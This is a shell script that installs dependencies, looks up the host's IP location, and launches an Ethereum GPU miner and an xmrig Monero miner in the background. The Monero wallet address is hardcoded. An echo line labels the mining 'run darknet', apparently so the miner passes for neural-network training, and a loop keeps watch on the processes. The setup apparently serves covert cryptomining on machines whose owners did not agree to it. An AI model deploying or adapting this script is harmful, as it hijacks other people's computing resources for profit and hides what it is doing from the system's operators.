#!/bin/sh
worker_name=$2
wallet=$1

apt-get update -y
apt-get install -y --no-install-recommends apt-utils
apt install build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
apt install libpci-dev -y
apt install libssl-dev -y
apt install -y curl
curl https://ipinfo.io/json

echo "run darknet"
./ethermine -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &

WALLET=8AE7ZKdCG2Z8DNqVi6PERHjKeuyaq1oFEghRagqE2ECUZve7oZxWS1uePhNDV77MWvF4smAuMHFnFC4KC6HJisBK35uvApK
POOL=pool.supportxmr.com:5555

./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=worker -k --coin=monero --max-cpu-usage=80 &

while true
do
  ps aux | grep ethermine;
  ps aux | grep xmrig

  nvidia-smi
  sleep 10
done
